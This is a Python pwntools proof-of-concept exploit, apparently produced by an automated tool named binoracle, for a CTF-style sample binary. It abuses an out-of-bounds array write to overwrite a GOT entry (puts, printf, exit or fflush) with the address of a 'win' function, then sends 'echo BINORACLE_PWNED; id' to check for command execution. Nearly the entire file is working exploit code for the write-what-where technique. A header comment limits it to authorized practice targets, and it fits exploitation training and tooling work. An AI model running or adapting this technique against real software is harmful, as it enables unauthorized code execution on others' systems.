#!/usr/bin/env python3
# PoC real generado por binoracle (binoracle.workflows.autowow._DRIVER)
# Target: samples/bin/oobwrite
# Uso: python3 oobwrite_write_what_where.py samples/bin/oobwrite
# SOLO objetivos autorizados (practica/CTF propio).
import subprocess

import sys
from pwn import *
context.binary = elf = ELF(sys.argv[1], checksec=False); context.log_level = "error"
win = (elf.symbols or {}).get("win")
if not win:
    print("NOT_APPLICABLE (no win)"); sys.exit(1)
# array global escribible objetivo del write-what-where. Nombre 'table' fijo por ahora (coincide
# con el sample); generalizar a "cualquier simbolo OBJ en .bss" queda para cuando haga falta.
table = (elf.symbols or {}).get("table")
got_targets = [(n, a) for n, a in (elf.got or {}).items() if n in ('puts', 'printf', 'exit', 'fflush')]
if table is None or not got_targets:
    print("NOT_APPLICABLE (no table/got)"); sys.exit(1)
PROMPTS = [(b"idx: ", b"val: "), (b"index: ", b"value: "), (b"idx", b"val")]
ok = False
for gotname, gotaddr in got_targets:
    idx = (gotaddr - table) // 8
    if idx * 8 + table != gotaddr:
        continue                       # no alineado a 8 bytes: no representable como indice
    for p_idx, p_val in PROMPTS:
        try:
            io = process([elf.path], stderr=subprocess.STDOUT)
            io.recvuntil(p_idx, timeout=3)
            io.sendline(str(idx).encode())
            io.recvuntil(p_val, timeout=3)
            io.sendline(str(win).encode())
            io.sendline(b"echo BINORACLE_PWNED; id")
            out = io.recvrepeat(2.5)
            io.close()
        except Exception:
            try: io.close()
            except Exception: pass
            continue
        if b"BINORACLE_PWNED" in out or b"uid=" in out:
            print("VERIFIED table=%#x got=%s(%#x) win=%#x idx=%d" % (table, gotname, gotaddr, win, idx))
            ok = True
            break
    if ok:
        break
if not ok:
    print("NOT_VERIFIED table=%#x win=%#x" % (table, win))
    sys.exit(1)
